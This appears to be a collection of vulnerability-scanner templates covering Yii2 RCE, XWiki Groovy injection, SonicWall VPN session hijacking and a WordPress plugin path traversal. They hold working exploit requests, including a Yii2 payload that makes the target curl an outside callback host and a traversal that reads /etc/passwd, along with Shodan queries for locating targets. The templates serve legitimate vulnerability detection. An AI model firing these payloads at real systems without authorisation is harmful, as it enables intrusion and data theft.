---
flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    type: word
    words:
    - Yii
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  redirects: true
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - condition: and
    type: word
    words:
    - PHP Version
    - PHP Extension
  matchers-condition: or
  raw:
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"as hack": {"__class": "GuzzleHttp\\\\Psr7\\\\FnStream", "class": "yii\\\\behaviors\\\\AttributeBehavior",
    "__construct()": [[]], "_fn_close": "system", "stream":"curl {{interactsh-url}}"}}

    '
  - 'POST /index.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"as hack": {"__class": "GuzzleHttp\\\\Psr7\\\\FnStream", "class": "yii\\\\behaviors\\\\AttributeBehavior",
    "__construct()": [[]], "_fn_close": "phpinfo"}}

    '
id: CVE-2024-58136
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:yiisoft:yii:2.0.0:*:*:*:*:*:*:*
    cve-id: CVE-2024-58136
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-94
    epss-percentile: 0.98514
    epss-score: 0.67064
  description: 'Yii2 PHP Framework before 2.0.52 is vulnerable to remote code execution
    via improper validation of the __class key in JSON behaviors. An attacker can
    instantiate arbitrary PHP classes and achieve RCE.

    '
  impact: 'Unauthenticated attackers can exploit improper validation of the __class
    key in JSON behaviors to instantiate arbitrary PHP classes and achieve remote
    code execution.

    '
  metadata:
    fofa-query: title="Yii"
    max-request: 3
    product: yii
    shodan-query: title:"Yii"
    vendor: yiisoft
    verified: true
  name: Yii2 PHP Framework < 2.0.52 - Remote Code Execution
  reference:
  - https://infosecwriteups.com/from-behaviors-to-shells-yii2-php-framework-rce-cve-2024-58136-exploit-and-mitigation-e47a60a3cecb
  - https://nvd.nist.gov/vuln/detail/CVE-2024-58136
  remediation: 'Update Yii2 PHP Framework to version 2.0.52 or later to address the
    remote code execution vulnerability.

    '
  severity: critical
  tags: cve,cve2024,yii2,rce,php,framework,kev,vkev,vuln
---
http:
- extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - data\-xwiki\-form\-token="([a-zA-Z0-9]+)">
    type: regex
  host-redirects: true
  matchers:
  - condition: and
    part: body_2
    type: word
    words:
    - Registration successful
    - Attack succeeded
    - Failed to execute the [groovy]
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  payloads:
    path:
    - null
    - /xwiki
  raw:
  - 'GET {{path}}/bin/register/XWiki/XWikiRegister?xredirect=%2Fbin%2Fregister%2FXWiki%2FXWikiRegister%3Fxredirect%3D%252Fbin%252Fregister%252FXWiki%252FXWikiRegister%253Fxredirect%253D%25252Fxwiki%25252Fbin%25252Fview%25252FScheduler%25252F%25253Fdo%25253Dtrigger%252526which%25253DScheduler.NotificationEmailDailySender
    HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST {{path}}/bin/register/XWiki/XWikiRegister?xredirect=%2Fbin%2Fregister%2FXWiki%2FXWikiRegister%3Fxredirect%3D%252Fxwiki%252Fbin%252Fview%252FScheduler%252F%253Fdo%253Dtrigger%2526which%253DScheduler.NotificationEmailDailySender
    HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    parent=xwiki%3AMain.UserDirectory&register_first_name={{firstname}}&register_last_name={{lastname}}&xwikiname={{user}}&register_password={{pass}}&register2_password={{pass}}&register_email="{{randstr}}%40{{rand_base(5)}}.com&xredirect=%2Fbin%2Fregister%2FXWiki%2FXWikiRegister%3Fxredirect%3D%252Fxwiki%252Fbin%252Fview%252FScheduler%252F%253Fdo%253Dtrigger%2526which%253DScheduler.NotificationEmailDailySender&form_token={{token}}

    '
  skip-variables-check: true
  stop-at-first-match: true
id: CVE-2024-21650
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:xwiki:xwiki:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-21650
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-95
    epss-percentile: 0.99741
    epss-score: 0.92678
  description: 'XWiki is vulnerable to a remote code execution (RCE) attack through
    its user registration feature. This issue allows an attacker to execute arbitrary
    code by crafting malicious payloads in the "first name" or "last name" fields
    during user registration. This impacts all installations that have user registration
    enabled for guests.

    '
  impact: 'Successful exploitation could lead to remote code execution.

    '
  metadata:
    fofa-query: body="data-xwiki-reference"
    max-request: 4
    product: xwiki
    shodan-query: html:"data-xwiki-reference"
    vendor: xwiki
    verified: true
  name: XWiki < 4.10.20 - Remote code execution
  reference:
  - https://jira.xwiki.org/browse/XWIKI-21173
  - https://nvd.nist.gov/vuln/detail/CVE-2024-21650
  remediation: 'This vulnerability has been patched in XWiki 14.10.17, 15.5.3 and
    15.8 RC1.

    '
  severity: critical
  tags: cve,cve2024,xwiki,rce,vkev,vuln
variables:
  email: '{{randstr}}%40{{rand_base(5)}}.com'
  firstname: '%5D%5D%7B%7B%2Fhtml%7D%7D%7B%7Basync%7D%7D%7B%7Bgroovy%7D%7Dservices.logging.getLogger%28%22attacker%22%29.error%28%22Attack+succeeded%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D'
  lastname: '{{rand_base(5)}}'
  pass: '{{rand_base(8)}}'
  user: '{{rand_base(6)}}'
---
http:
- extractors:
  - part: header
    regex:
    - 'Set-Cookie: swap=([a-zA-Z0-9]+);'
    type: regex
  matchers:
  - type: word
    words:
    - NELaunchX1
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /cgi-bin/sslvpnclient?launchplatform= HTTP/1.1

    Host: {{Hostname}}

    Cookie: swap=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=

    Connection: close

    '
id: CVE-2024-53704
info:
  author: johnk3r
  classification:
    cve-id: CVE-2024-53704
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.99863
    epss-score: 0.93864
  description: 'An Improper Authentication vulnerability in the SSLVPN authentication
    mechanism allows a remote attacker to bypass authentication.

    '
  impact: 'Unauthenticated attackers can hijack SSL VPN sessions by bypassing authentication
    mechanisms and gaining unauthorized access to the VPN.

    '
  metadata:
    max-request: 1
    shodan-query: http.html_hash:-1466805544
    verified: true
  name: SSL VPN Session Hijacking
  reference:
  - https://bishopfox.com/blog/sonicwall-cve-2024-53704-ssl-vpn-session-hijacking
  - https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2025-0003
  remediation: 'Update SonicWall to a version that patches CVE-2024-53704 as specified
    in PSIRT advisory SNWLID-2025-0003.

    '
  severity: critical
  tags: cve,cve2024,sonicwall,kev,vkev,vuln
---
http:
- matchers:
  - condition: and
    dsl:
    - contains(header, "filename=\"passwd")
    - regex('root:.*:0:0:', body)
    - status_code == 200
    type: dsl
  raw:
  - 'GET /wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file={{file}}&ticket={{ticket}}&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_{{upload}}
    HTTP/1.1

    Host: {{Hostname}}

    Cookie: wp_wpfileupload_{{upload}}={{upload_more}}; wfu_storage_{{file}}=/../../../../../etc/passwd[[name]];
    wfu_download_ticket_{{ticket}}={{time}}; wfu_ABSPATH=/;

    '
id: CVE-2024-9047
info:
  author: s4e-io,S9n3x
  classification:
    cve-id: CVE-2024-9047
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-22
    epss-percentile: 0.99829
    epss-score: 0.93618
  description: 'The WordPress File Upload plugin for WordPress is vulnerable to Path
    Traversal in all versions up to, and including, 4.24.11 via wfu_file_downloader.php.
    This makes it possible for unauthenticated attackers to read or delete files outside
    of the originally intended directory. Successful exploitation requires the targeted
    WordPress installation to be using PHP 7.4 or earlier.

    '
  impact: 'Unauthenticated attackers can read or delete arbitrary files outside the
    intended directory on WordPress sites running PHP 7.4 or earlier, potentially
    exposing sensitive configuration files, credentials, and causing system disruption.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/wp-file-upload"
    framework: wordpress
    max-request: 1
    product: wordpress-file-upload
    publicwww-query: /wp-content/plugins/wp-file-upload/
    shodan-query: http.html:"/wp-content/plugins/wp-file-upload/"
    vendor: nickolas_bossinas
  name: WordPress File Upload <= 4.24.11 - Arbitrary File Read
  reference:
  - https://github.com/iSee857/CVE-2024-9047-PoC
  - https://nvd.nist.gov/vuln/detail/cve-2024-9047
  - https://plugins.trac.wordpress.org/changeset/3164449/wp-file-upload
